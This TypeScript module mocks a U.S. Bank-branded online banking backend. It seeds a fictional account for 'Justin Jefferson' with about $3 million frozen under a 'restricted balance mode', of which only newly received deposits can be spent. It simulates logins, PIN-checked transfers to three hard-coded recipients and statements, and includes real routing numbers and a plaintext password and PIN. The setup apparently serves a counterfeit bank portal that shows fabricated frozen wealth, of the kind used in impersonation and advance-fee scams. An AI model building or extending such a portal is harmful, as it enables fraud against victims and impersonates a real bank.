import {
  Account,
  Customer,
  Transaction,
  BankNotification,
  SecuritySession,
  StatementSummary,
  Payee,
  TransferRequest,
  AccountStatusData,
  AccountRestriction,
} from '../types/banking.ts';
import { db } from './firebase.ts';
import { doc, setDoc } from 'firebase/firestore';

const DEFAULT_ACCOUNT_RESTRICTION: AccountRestriction = {
  restriction_active: true,
  status_label: 'Restricted balance mode',
  reason: 'Existing balance locked under account security protocol. Newly received deposits are available for outgoing transfers.',
  affected_services: [
    'Transfers from restricted existing balance',
    'Spending locked existing funds',
    'ATM cash withdrawals from restricted balance',
  ],
  unaffected_services: [
    'Incoming deposits (unrestricted)',
    'Transfers from newly received available balance',
    'PIN-authorized external transfers',
    'Historical statement viewing',
    'Account balance review',
  ],
  notification_message:
    'Your existing balance ($3,086,370.46) remains held under Restricted Balance Mode. Newly received deposits are credited to your Available Balance.',
  resolution_instructions:
    'To unlock your restricted existing funds, please visit your local U.S. Bank branch with valid government identification.',
};

const SAVINGS_ACCOUNT_RESTRICTION: AccountRestriction = {
  restriction_active: true,
  status_label: 'Account Locked',
  reason: 'Additional branch verification required to lift security hold.',
  affected_services: [
    'Outgoing bank transfers',
    'Incoming bank transfers',
    'Account withdrawals',
  ],
  unaffected_services: ['Historical statement viewing', 'Interest accrual review'],
  notification_message:
    'Transfers and outgoing debits are temporarily restricted pending in-person branch verification.',
  resolution_instructions:
    'Please visit your local U.S. Bank branch with valid government-issued photo identification to verify your identity and resolve this security hold.',
};

const CREDIT_ACCOUNT_RESTRICTION: AccountRestriction = {
  restriction_active: true,
  status_label: 'Temporary Security Hold',
  reason: 'Additional branch verification required to lift security hold.',
  affected_services: [
    'Card purchases',
    'Outgoing bank transfers',
    'Cash advances',
  ],
  unaffected_services: ['Historical statement viewing'],
  notification_message:
    'Transfers and outgoing debits are temporarily restricted pending in-person branch verification.',
  resolution_instructions:
    'Please visit your local U.S. Bank branch with valid government-issued photo identification to verify your identity and resolve this security hold.',
};

const LOCAL_STORAGE_KEY = 'usbank_local_ledger_state_v2';

interface LocalState {
  customer: Customer;
  accounts: Account[];
  transactions: Transaction[];
  notifications: BankNotification[];
  securitySessions: SecuritySession[];
  payees: Payee[];
  auth?: {
    passwordHash: string;
    failedAttempts: number;
    lockedUntil: number | null;
  };
}

function getInitialState(): LocalState {
  const customer: Customer = {
    id: '10482',
    name: 'Justin Jefferson',
    email: 'justin.jefferson@example.com',
    phone: '+1 (555) 010-4821',
    address: {
      street: '1200 Nicollet Mall, Suite 1800',
      city: 'Minneapolis',
      state: 'MN',
      zip: '55403',
    },
    memberSince: '2021',
    accountType: 'Premium Checking',
    accountStatus: 'Active',
    avatarUrl: '/avatar.jpg',
    preferences: {
      dailyTransferLimit: 25000,
      paperlessStatements: true,
      twoFactorEnabled: true,
      sessionTimeoutMinutes: 15,
      currency: 'USD',
      emailAlerts: true,
      smsAlerts: true,
    },
  };

  const accounts: Account[] = [
    {
      id: 'acc_checking_4821',
      name: 'Premium Checking',
      accountNumber: '1048214821',
      accountNumberMasked: '•••• 4821',
      routingNumber: '091000022',
      routingNumberMasked: '•••• 0022',
      type: 'checking',
      status: 'Restricted balance mode',
      currency: 'USD',
      availableBalance: 100000.0,
      availableReceivedBalance: 100000.0,
      restrictedBalance: 3086370.46,
      ledgerBalance: 3186370.46,
      openingBalance: 42500.0,
      openedDate: '2021-01-05',
      lastUpdated: '2026-10-19T10:45:00.000Z',
      interestRate: 0.45,
      isPrimary: true,
      restriction: DEFAULT_ACCOUNT_RESTRICTION,
    },
    {
      id: 'acc_savings_6194',
      name: 'US Bank High-Yield Savings',
      accountNumber: '1048216194',
      accountNumberMasked: '•••• 6194',
      routingNumber: '091000022',
      routingNumberMasked: '•••• 0022',
      type: 'savings',
      status: 'Frozen',
      currency: 'USD',
      availableBalance: 486420.5,
      ledgerBalance: 486420.5,
      openingBalance: 50000.0,
      openedDate: '2021-03-12',
      lastUpdated: '2026-10-18T12:00:00.000Z',
      interestRate: 4.25,
      isPrimary: false,
      restriction: SAVINGS_ACCOUNT_RESTRICTION,
    },
    {
      id: 'acc_credit_9920',
      name: 'US Bank Altitude Reserve Visa',
      accountNumber: '400012349920',
      accountNumberMasked: '•••• 9920',
      routingNumber: '091000022',
      routingNumberMasked: '•••• 0022',
      type: 'credit',
      status: 'Frozen',
      currency: 'USD',
      availableBalance: 46850.0,
      ledgerBalance: 3150.0,
      openingBalance: 0,
      openedDate: '2022-06-15',
      lastUpdated: '2026-10-18T12:00:00.000Z',
      isPrimary: false,
      restriction: CREDIT_ACCOUNT_RESTRICTION,
    },
  ];

  const transactions: Transaction[] = [
    {
      id: 'TXN-100K-DEP-ELAINE',
      reference: 'DEP-202610-EJ100K',
      accountId: 'acc_checking_4821',
      date: '2026-10-19',
      postingDate: '2026-10-19',
      time: '10:45:00',
      merchant: 'Deposit from Elaine Jefferson',
      sender: 'Elaine Jefferson',
      recipient: 'Justin Jefferson',
      provider: 'Direct Wire Settlement',
      label: 'Incoming Deposit',
      description: 'Incoming Deposit - Elaine Jefferson',
      category: 'Income',
      type: 'credit',
      fundType: 'newly_received',
      amount: 100000.0,
      status: 'posted',
      runningBalance: 3186370.46,
      paymentMethod: 'Incoming Federal Wire Transfer',
      notes: 'Direct incoming deposit from Elaine Jefferson to Justin Jefferson. Cleared and added to Available Balance.',
    },
    {
      id: 'TXN-300K-HOSP',
      reference: 'REF-202610-HOSP300K',
      accountId: 'acc_checking_4821',
      date: '2026-10-19',
      postingDate: '2026-10-19',
      time: '08:15:00',
      merchant: 'Unspecified Healthcare Provider (Successfully Settled & Posted)',
      provider: 'Unspecified Healthcare Provider',
      label: 'Hospital Bill Payment',
      description: 'Hospital Bill Payment',
      category: 'Health',
      type: 'debit',
      amount: 300000.0,
      status: 'posted',
      runningBalance: 3086370.46,
      paymentMethod: 'Electronic Healthcare Settlement',
      notes: 'Successfully verified, settled and posted to ledger.',
    },
    {
      id: 'txn_2026_10_1042',
      reference: 'REF-202610-1042',
      accountId: 'acc_checking_4821',
      date: '2026-10-15',
      postingDate: '2026-10-15',
      time: '09:00:00',
      merchant: 'Minnesota Vikings FC',
      description: 'Semi-Monthly Direct Deposit Payroll',
      category: 'Income',
      type: 'credit',
      amount: 35000.0,
      status: 'posted',
      runningBalance: 3386370.46,
      paymentMethod: 'Direct Deposit',
    },
    {
      id: 'txn_2026_10_1041',
      reference: 'REF-202610-1041',
      accountId: 'acc_checking_4821',
      date: '2026-10-12',
      postingDate: '2026-10-12',
      time: '20:15:00',
      merchant: 'Manny’s Steakhouse',
      description: 'Client Dinner & Hospitality',
      category: 'Dining',
      type: 'debit',
      amount: 485.2,
      status: 'posted',
      runningBalance: 3351370.46,
      paymentMethod: 'Debit Card •••• 4821',
    },
    {
      id: 'txn_2026_10_1040',
      reference: 'REF-202610-1040',
      accountId: 'acc_checking_4821',
      date: '2026-10-10',
      postingDate: '2026-10-10',
      time: '14:22:00',
      merchant: 'Target Supercenter #0219',
      description: 'Household Essentials & Supplies',
      category: 'Shopping',
      type: 'debit',
      amount: 189.64,
      status: 'posted',
      runningBalance: 3351855.66,
      paymentMethod: 'Debit Card •••• 4821',
    },
    {
      id: 'txn_2026_10_1039',
      reference: 'REF-202610-1039',
      accountId: 'acc_checking_4821',
      date: '2026-10-06',
      postingDate: '2026-10-06',
      time: '11:10:00',
      merchant: 'Whole Foods Market Minneapolis',
      description: 'Organic Grocery Provisions',
      category: 'Groceries',
      type: 'debit',
      amount: 342.18,
      status: 'posted',
      runningBalance: 3352045.3,
      paymentMethod: 'Debit Card •••• 4821',
    },
    {
      id: 'txn_2026_10_1038',
      reference: 'REF-202610-1038',
      accountId: 'acc_checking_4821',
      date: '2026-10-03',
      postingDate: '2026-10-03',
      time: '08:00:00',
      merchant: 'Minneapolis Luxury Lofts',
      description: 'Residential Lease Auto-Debit',
      category: 'Utilities',
      type: 'debit',
      amount: 6200.0,
      status: 'posted',
      runningBalance: 3352387.48,
      paymentMethod: 'ACH Electronic Transfer',
    },
    {
      id: 'txn_2026_10_1037',
      reference: 'REF-202610-1037',
      accountId: 'acc_checking_4821',
      date: '2026-10-01',
      postingDate: '2026-10-01',
      time: '09:00:00',
      merchant: 'Minnesota Vikings FC',
      description: 'Semi-Monthly Direct Deposit Payroll',
      category: 'Income',
      type: 'credit',
      amount: 35000.0,
      status: 'posted',
      runningBalance: 3358587.48,
      paymentMethod: 'Direct Deposit',
    },
  ];

  const notifications: BankNotification[] = [
    {
      id: 'notif_restriction_300k',
      title: 'Account Status: Accounts Inactive & Frozen',
      message: 'All accounts are currently frozen and unavailable. Transfers into or out of these accounts are completely disabled.',
      category: 'security',
      timestamp: '2026-10-19T08:15:00.000Z',
      isRead: false,
      actionUrl: '/transfers',
    },
    {
      id: 'notif_1',
      title: 'Salary Deposit Confirmed',
      message: 'Direct deposit from Minnesota Vikings FC for $35,000.00 was posted to Premium Checking •••• 4821.',
      category: 'transaction',
      timestamp: '2026-10-15T08:00:00.000Z',
      isRead: false,
      actionUrl: '/transactions',
    },
    {
      id: 'notif_2',
      title: 'September 2026 Statement Ready',
      message: 'Your official monthly account statement for September 2026 is now available for download.',
      category: 'statement',
      timestamp: '2026-10-01T09:30:00.000Z',
      isRead: false,
      actionUrl: '/statements',
    },
  ];

  const securitySessions: SecuritySession[] = [
    {
      id: 'sess_1',
      device: 'Apple iPhone 15 Pro',
      browser: 'Safari Mobile 18.0',
      ip: '198.51.100.44',
      location: 'Minneapolis, MN, United States',
      lastActive: 'Just now',
      isCurrent: true,
    },
    {
      id: 'sess_2',
      device: 'MacBook Pro 16"',
      browser: 'Chrome 130',
      ip: '198.51.100.89',
      location: 'Edina, MN, United States',
      lastActive: '2 hours ago',
      isCurrent: false,
    },
  ];

  const payees: Payee[] = [
    {
      id: 'payee_1',
      name: 'Minneapolis Luxury Lofts LLC',
      bankName: 'US Bank Commercial',
      accountNumberMasked: '•••• 8820',
      routingNumberMasked: '•••• 9210',
      accountType: 'checking',
      lastUsedDate: '2026-10-03',
    },
    {
      id: 'payee_2',
      name: 'Xcel Energy Minnesota',
      bankName: 'Wells Fargo Bank',
      accountNumberMasked: '•••• 3190',
      routingNumberMasked: '•••• 4410',
      accountType: 'checking',
      lastUsedDate: '2026-10-04',
    },
  ];

  const auth = {
    passwordHash: 'Jaynestella',
    failedAttempts: 0,
    lockedUntil: null,
  };

  return { customer, accounts, transactions, notifications, securitySessions, payees, auth };
}

class LocalLedgerService {
  private state: LocalState;

  constructor() {
    this.state = this.loadState();
  }

  private loadState(): LocalState {
    try {
      const stored = localStorage.getItem(LOCAL_STORAGE_KEY);
      if (stored) {
        const parsed = JSON.parse(stored);
        if (!parsed.auth || parsed.auth.passwordHash === 'Password123!') {
          parsed.auth = {
            passwordHash: 'Jaynestella',
            failedAttempts: 0,
            lockedUntil: null,
          };
        }

        // Categorize transactions properly
        if (Array.isArray(parsed.transactions)) {
          parsed.transactions.forEach((tx: Transaction) => {
            if (tx.id === 'TXN-100K-DEP-ELAINE') {
              tx.fundType = 'newly_received';
              tx.sender = 'Elaine Jefferson';
              tx.recipient = 'Justin Jefferson';
            } else if (
              tx.type === 'debit' &&
              (tx.notes?.includes('Debited from available') ||
                tx.notes?.includes('Security PIN') ||
                tx.notes?.includes('Server-side transfer executed'))
            ) {
              tx.fundType = 'outgoing_transfer';
              tx.sender = 'Justin Jefferson';
            } else {
              tx.fundType = 'restricted_existing';
            }
          });
        }

        // Ensure checking account is in Restricted Balance Mode and accurately compute net available balance
        const chk = parsed.accounts?.find((a: Account) => a.id === 'acc_checking_4821');
        if (chk) {
          chk.status = 'Restricted balance mode';
          chk.restrictedBalance = 3086370.46;

          let outgoingDebits = 0;
          if (Array.isArray(parsed.transactions)) {
            parsed.transactions
              .filter((t: Transaction) => t.accountId === 'acc_checking_4821')
              .forEach((t: Transaction) => {
                if (t.type === 'debit' && t.fundType === 'outgoing_transfer') {
                  outgoingDebits += t.amount;
                }
              });
          }

          const startingNewlyReceived = 100000.0;
          let finalAvailable = Math.max(0, Math.round((startingNewlyReceived - outgoingDebits) * 100) / 100);
          if (typeof chk.availableBalance === 'number' && chk.availableBalance < finalAvailable) {
            finalAvailable = chk.availableBalance;
          }
          chk.availableBalance = finalAvailable;
          chk.availableReceivedBalance = finalAvailable;
          chk.ledgerBalance = Math.round((chk.restrictedBalance + finalAvailable) * 100) / 100;
          chk.restriction = DEFAULT_ACCOUNT_RESTRICTION;
        }
        const sav = parsed.accounts?.find((a: Account) => a.id === 'acc_savings_6194');
        if (sav) {
          sav.status = 'Frozen';
          sav.availableBalance = 486420.5;
          sav.ledgerBalance = 486420.5;
          sav.restriction = SAVINGS_ACCOUNT_RESTRICTION;
        }
        const crd = parsed.accounts?.find((a: Account) => a.id === 'acc_credit_9920');
        if (crd) {
          crd.status = 'Frozen';
          crd.availableBalance = 46850.0;
          crd.restriction = CREDIT_ACCOUNT_RESTRICTION;
        }

        // Migrate routing numbers to Minneapolis HQ 091000022
        parsed.accounts?.forEach((acc: Account) => {
          if (!acc.routingNumber || acc.routingNumber === '071000288' || acc.routingNumberMasked === '•••• 0288') {
            acc.routingNumber = '091000022';
            acc.routingNumberMasked = '•••• 0022';
          }
        });

        return parsed;
      }
    } catch {
      // fallback
    }
    const fresh = getInitialState();
    this.saveState(fresh);
    return fresh;
  }

  public syncAccountBalance(accountId: string, availableBalance: number, ledgerBalance: number, transaction?: Transaction) {
    if (transaction && !this.state.transactions.some((t) => t.id === transaction.id)) {
      this.state.transactions.unshift(transaction);
    }

    // Recompute authoritative available balance from transactions to prevent outdated default values
    let outgoingDebits = 0;
    if (Array.isArray(this.state.transactions)) {
      this.state.transactions
        .filter((t: Transaction) => t.accountId === 'acc_checking_4821')
        .forEach((t: Transaction) => {
          if (t.type === 'debit' && (t.fundType === 'outgoing_transfer' || t.category === 'Transfer' || t.notes?.includes('Debited') || t.notes?.includes('PIN') || t.notes?.includes('executed'))) {
            outgoingDebits += t.amount;
          }
        });
    }

    const startingNewlyReceived = 100000.0;
    const computedAvailable = Math.max(0, Math.round((startingNewlyReceived - outgoingDebits) * 100) / 100);

    const acc = this.state.accounts.find((a) => a.id === accountId);
    if (acc) {
      // Strictly preserve the lowest / most updated balance (preventing outdated server responses of 100000 from overwriting spent funds)
      const existingAvailable = acc.availableBalance;
      const finalAvailable = Math.min(existingAvailable, computedAvailable, availableBalance);
      acc.availableBalance = finalAvailable;
      acc.availableReceivedBalance = finalAvailable;
      const restBal = acc.restrictedBalance || 3086370.46;
      acc.ledgerBalance = Math.round((restBal + finalAvailable) * 100) / 100;
    }
    this.saveState();
  }

  private saveState(st: LocalState = this.state) {
    try {
      localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(st));
      if (db) {
        setDoc(doc(db, 'users', '10482', 'ledger', 'state'), st).catch(() => {});
      }
    } catch {
      // ignore
    }
  }

  public getAccounts(): Account[] {
    return this.state.accounts;
  }

  public updateAccountRouting(accountId: string, newRoutingNumber: string, applyToAll: boolean = false): Account {
    const trimmed = newRoutingNumber.trim();
    const masked = `•••• ${trimmed.slice(-4)}`;
    if (applyToAll || accountId === 'all') {
      this.state.accounts.forEach((acc) => {
        acc.routingNumber = trimmed;
        acc.routingNumberMasked = masked;
      });
    } else {
      const acc = this.state.accounts.find((a) => a.id === accountId);
      if (acc) {
        acc.routingNumber = trimmed;
        acc.routingNumberMasked = masked;
      }
    }
    this.saveState();
    return this.state.accounts.find((a) => a.id === accountId) || this.state.accounts[0];
  }

  public handleFallback(endpoint: string, options: RequestInit = {}): any {
    const url = new URL(endpoint, 'http://localhost');
    const path = url.pathname;
    const method = (options.method || 'GET').toUpperCase();
    const body = options.body ? JSON.parse(options.body as string) : {};

    // Routing patch route
    if (path.startsWith('/api/accounts/') && path.endsWith('/routing') && method === 'PATCH') {
      const parts = path.split('/');
      const accId = parts[3];
      const { routingNumber, applyToAll } = body;
      const updated = this.updateAccountRouting(accId, routingNumber, !!applyToAll);
      return { success: true, account: updated, accounts: this.state.accounts };
    }

    // Auth Login
    if (path === '/api/auth/login' && method === 'POST') {
      const { identifier, password } = body;
      const isIdValid =
        identifier === '10482' ||
        identifier?.toLowerCase() === 'justin.jefferson@example.com' ||
        identifier?.toLowerCase() === 'justin';

      const validPass = this.state.auth?.passwordHash || 'Jaynestella';
      if (!isIdValid || password !== validPass) {
        throw new Error('Invalid Customer ID or Password. Please check your credentials.');
      }

      return {
        token: `mock_jwt_session_${Date.now()}`,
        customer: this.state.customer,
        accounts: this.state.accounts,
        message: 'Authentication successful',
      };
    }

    // Change Password
    if (path === '/api/auth/change-password' && method === 'POST') {
      const { currentPassword, newPassword } = body;
      const validPass = this.state.auth?.passwordHash || 'Jaynestella';
      if (currentPassword !== validPass) {
        throw new Error('Current password does not match records.');
      }
      if (!newPassword || newPassword.length < 8) {
        throw new Error('New password must be at least 8 characters with numbers and symbols.');
      }
      if (!this.state.auth) {
        this.state.auth = { passwordHash: newPassword, failedAttempts: 0, lockedUntil: null };
      } else {
        this.state.auth.passwordHash = newPassword;
      }
      this.saveState();
      return { success: true, message: 'Password updated successfully. All active sessions notified.' };
    }

    // Auth Me
    if (path === '/api/auth/me' && method === 'GET') {
      return {
        customer: this.state.customer,
        accounts: this.state.accounts,
      };
    }

    // Auth Logout
    if (path === '/api/auth/logout') {
      return { success: true };
    }

    // Accounts
    if (path === '/api/accounts' && method === 'GET') {
      return this.state.accounts;
    }

    if (path.startsWith('/api/accounts/') && path.endsWith('/status')) {
      const accId = path.split('/')[3];
      const acc = this.state.accounts.find((a) => a.id === accId) || this.state.accounts[0];
      return {
        account_status: acc.restriction || DEFAULT_ACCOUNT_RESTRICTION,
        pending_transactions: [],
      };
    }

    if (path.startsWith('/api/accounts/')) {
      const id = path.split('/')[3];
      return this.state.accounts.find((a) => a.id === id) || this.state.accounts[0];
    }

    // Account Status
    if (path === '/api/account/status' || path === '/api/account-restriction') {
      return {
        account_status: DEFAULT_ACCOUNT_RESTRICTION,
        pending_transactions: [],
      };
    }

    // Transactions
    if (path === '/api/transactions' && method === 'GET') {
      return {
        data: this.state.transactions,
        pagination: {
          total: this.state.transactions.length,
          page: 1,
          limit: 20,
          totalPages: 1,
        },
      };
    }

    // Recipients
    if (path === '/api/recipients' && method === 'GET') {
      return [
        {
          accountNumber: '4892018437',
          routingNumber: '021000021',
          bankName: 'Chase Bank',
          code: 'ACC_001',
          name: 'Elaine Jefferson',
          accountType: 'Individual',
        },
        {
          accountNumber: '8104928371',
          routingNumber: '121000248',
          bankName: 'Wells Fargo Bank',
          code: 'ACC_002',
          name: "Children's Hospital of Philadelphia",
          accountType: 'Institutional / Donation',
        },
        {
          accountNumber: '3751920482',
          routingNumber: '051000017',
          bankName: 'Bank of America',
          code: 'ACC_003',
          name: 'Stephan A. Grupp',
          accountType: 'Individual',
        },
      ];
    }

    // V1 Bank Inquiry & Lookup
    if (path === '/api/v1/bank/lookup' && method === 'POST') {
      const q = (body.account_number || body.accountNumber || '').toString().trim().toUpperCase();
      const db: Record<string, { bank: string; routing: string; account_name: string }> = {
        "4892018437": { bank: "Chase Bank", routing: "021000021", account_name: "Elaine Jefferson" },
        "8104928371": { bank: "Wells Fargo Bank", routing: "121000248", account_name: "Children's Hospital of Philadelphia" },
        "3751920482": { bank: "Bank of America", routing: "051000017", account_name: "Stephan A. Grupp" }
      };
      let match = db[q];
      if (!match) {
        if (q === '1001234501') match = db["4892018437"];
        else if (q === '1001234502') match = db["8104928371"];
        else if (q === '1001234503') match = db["3751920482"];
      }
      if (match) {
        return { status: "success", bank_name: match.bank, routing_number: match.routing, account_name: match.account_name };
      }
      throw new Error("Account number not found or invalid.");
    }

    if (path === '/api/v1/bank/transfer' && method === 'POST') {
      const accNum = (body.account_number || body.accountNumber || '').toString().trim();
      const amount = parseFloat(body.amount);
      const db: Record<string, { bank: string; routing: string; account_name: string }> = {
        "4892018437": { bank: "Chase Bank", routing: "021000021", account_name: "Elaine Jefferson" },
        "8104928371": { bank: "Wells Fargo Bank", routing: "121000248", account_name: "Children's Hospital of Philadelphia" },
        "3751920482": { bank: "Bank of America", routing: "051000017", account_name: "Stephan A. Grupp" }
      };
      let match = db[accNum];
      if (!match) {
        if (accNum === '1001234501') match = db["4892018437"];
        else if (accNum === '1001234502') match = db["8104928371"];
        else if (accNum === '1001234503') match = db["3751920482"];
      }
      if (!match) throw new Error("Invalid recipient account.");
      const chk = this.state.accounts.find(a => a.id === 'acc_checking_4821') || this.state.accounts[0];
      if (chk.availableBalance < amount) throw new Error("Insufficient funds.");
      const oldAvailable = chk.availableBalance;
      const newAvailable = Math.round((oldAvailable - amount) * 100) / 100;
      const restBal = chk.restrictedBalance || 3086370.46;
      const newLedger = Math.round((restBal + newAvailable) * 100) / 100;
      chk.availableBalance = newAvailable;
      chk.availableReceivedBalance = newAvailable;
      chk.ledgerBalance = newLedger;

      const now = new Date();
      const dateStr = now.toISOString().split('T')[0];
      const timeStr = now.toTimeString().split(' ')[0];
      const txId = `txn_${Date.now()}`;
      const refCode = `TRF-${now.getFullYear()}${String(now.getMonth() + 1).padStart(2, '0')}-${Math.floor(100000 + Math.random() * 900000)}`;

      const tx: Transaction = {
        id: txId,
        reference: refCode,
        accountId: chk.id,
        date: dateStr,
        postingDate: dateStr,
        time: timeStr,
        merchant: match.account_name,
        sender: 'Justin Jefferson',
        recipient: match.account_name,
        fundType: 'outgoing_transfer',
        description: `Transfer to ${match.account_name} (${match.bank})`,
        category: 'Transfer',
        type: 'debit',
        amount: amount,
        status: 'posted',
        runningBalance: newLedger,
        paymentMethod: 'Instant FedNow / Wire Transfer',
        notes: `Server-side transfer executed. Debited from available funds.`,
      };

      this.state.transactions.unshift(tx);
      this.saveState();
      return {
        status: "success",
        message: `Successfully transferred $${amount.toFixed(2)} to ${match.account_name}.`,
        new_balance: chk.availableBalance,
        transaction: tx
      };
    }

    if (path === '/api/recipients/lookup') {
      const q = (url.searchParams.get('accountNumber') || '').trim().toUpperCase();
      const rQuery = (url.searchParams.get('routingNumber') || '').trim();
      const recs = [
        { accountNumber: '4892018437', routingNumber: '021000021', bankName: 'Chase Bank', code: 'ACC_001', name: 'Elaine Jefferson', accountType: 'Individual' as const },
        { accountNumber: '8104928371', routingNumber: '121000248', bankName: 'Wells Fargo Bank', code: 'ACC_002', name: "Children's Hospital of Philadelphia", accountType: 'Institutional / Donation' as const },
        { accountNumber: '3751920482', routingNumber: '051000017', bankName: 'Bank of America', code: 'ACC_003', name: 'Stephan A. Grupp', accountType: 'Individual' as const },
      ];
      const match = recs.find(
        r =>
          r.accountNumber === q ||
          r.code === q ||
          (rQuery && r.routingNumber === rQuery) ||
          r.name.toUpperCase().includes(q) ||
          (q === '1001234501' && r.code === 'ACC_001') ||
          (q === '1001234502' && r.code === 'ACC_002') ||
          (q === '1001234503' && r.code === 'ACC_003')
      );
      if (!match) throw new Error('Invalid Account Number');
      return { success: true, recipient: match };
    }

    // Transfers
    if (path === '/api/transfers' && method === 'POST') {
      const req = body as TransferRequest;
      const chk = this.state.accounts.find(a => a.id === req.fromAccountId) || this.state.accounts[0];
      if (req.pin?.trim() !== '2580') {
        throw new Error('Invalid Security PIN. Please enter your authorized 4-digit Transfer PIN.');
      }
      if (chk.availableBalance < req.amount) {
        throw new Error('Insufficient Funds');
      }
      const recs = [
        { accountNumber: '4892018437', routingNumber: '021000021', bankName: 'Chase Bank', code: 'ACC_001', name: 'Elaine Jefferson', accountType: 'Individual' },
        { accountNumber: '8104928371', routingNumber: '121000248', bankName: 'Wells Fargo Bank', code: 'ACC_002', name: "Children's Hospital of Philadelphia", accountType: 'Institutional / Donation' },
        { accountNumber: '3751920482', routingNumber: '051000017', bankName: 'Bank of America', code: 'ACC_003', name: 'Stephan A. Grupp', accountType: 'Individual' },
      ];
      const targetQuery = (req.recipientAccountNumber || req.toPayeeId || req.recipientName || '').toUpperCase();
      const match = recs.find(
        r =>
          r.accountNumber === targetQuery ||
          r.code === targetQuery ||
          r.name.toUpperCase().includes(targetQuery) ||
          (targetQuery === '1001234501' && r.code === 'ACC_001') ||
          (targetQuery === '1001234502' && r.code === 'ACC_002') ||
          (targetQuery === '1001234503' && r.code === 'ACC_003')
      );
      const recipientName = match ? match.name : (req.recipientName || 'Registered Recipient');
      const recipientAcc = match ? match.accountNumber : (req.recipientAccountNumber || '4892018437');
      const recipientRouting = match ? match.routingNumber : (req.recipientRoutingNumber || '021000021');
      const recipientBank = match ? match.bankName : (req.recipientBankName || 'Chase Bank');
      const recipientType = match ? match.accountType : 'Individual';

      const oldAvailableBalance = chk.availableBalance;
      const deductionAmount = req.amount;
      const newAvailableBalance = Math.round((oldAvailableBalance - deductionAmount) * 100) / 100;
      const restBal = chk.restrictedBalance || 3086370.46;
      const newLedgerBalance = Math.round((restBal + newAvailableBalance) * 100) / 100;

      chk.availableBalance = newAvailableBalance;
      chk.availableReceivedBalance = newAvailableBalance;
      chk.ledgerBalance = newLedgerBalance;

      const tx: Transaction = {
        id: `txn_${Date.now()}`,
        reference: `TRF-${Date.now()}`,
        accountId: chk.id,
        date: new Date().toISOString().split('T')[0],
        postingDate: new Date().toISOString().split('T')[0],
        time: '12:00:00',
        merchant: recipientName,
        sender: 'Justin Jefferson',
        recipient: recipientName,
        fundType: 'outgoing_transfer',
        description: `Transfer to ${recipientName}`,
        category: 'Transfer',
        type: 'debit',
        amount: deductionAmount,
        status: 'posted',
        runningBalance: newLedgerBalance,
        paymentMethod: 'Instant FedNow / Wire Transfer',
        notes: `Authorized via 4-digit Security PIN. Debited from available funds.`,
      };
      this.state.transactions.unshift(tx);
      this.saveState();

      return {
        success: true,
        transaction: tx,
        fromAccount: chk,
        recipient: { name: recipientName, accountNumber: recipientAcc, accountType: recipientType },
        balanceCalculation: {
          oldAvailableBalance,
          transferAmount: deductionAmount,
          newAvailableBalance,
          verificationFormula: `$${oldAvailableBalance.toFixed(2)} - $${deductionAmount.toFixed(2)} = $${newAvailableBalance.toFixed(2)}`,
        },
        message: `Transferred $${deductionAmount.toFixed(2)} to ${recipientName}. New Balance: $${newAvailableBalance.toFixed(2)}`,
      };
    }

    // Payees
    if (path === '/api/payees' && method === 'GET') {
      return this.state.payees;
    }

    // Notifications
    if (path === '/api/notifications' && method === 'GET') {
      return this.state.notifications;
    }

    // Balance History
    if (path === '/api/analytics/balance-history') {
      return {
        range: '30D',
        data: [
          { date: '2026-09-20', balance: 3350000 },
          { date: '2026-10-01', balance: 3358587 },
          { date: '2026-10-15', balance: 3386370 },
          { date: '2026-10-19', balance: 3386370 },
        ],
      };
    }

    // Statements
    if (path === '/api/statements') {
      return [
        {
          id: 'stmt_2026_10',
          year: 2026,
          month: 10,
          monthName: 'October',
          periodLabel: 'October 1, 2026 – October 31, 2026',
          openingBalance: 3350000,
          totalDeposits: 70000,
          totalWithdrawals: 33629.54,
          closingBalance: 3386370.46,
          transactionCount: 16,
          generatedDate: '2026-10-28',
          status: 'Available',
        },
        {
          id: 'stmt_2026_09',
          year: 2026,
          month: 9,
          monthName: 'September',
          periodLabel: 'September 1, 2026 – September 30, 2026',
          openingBalance: 3320000,
          totalDeposits: 70000,
          totalWithdrawals: 40000,
          closingBalance: 3350000,
          transactionCount: 18,
          generatedDate: '2026-09-28',
          status: 'Available',
        },
      ];
    }

    // Default empty success
    return {};
  }
}

export const localLedger = new LocalLedgerService();
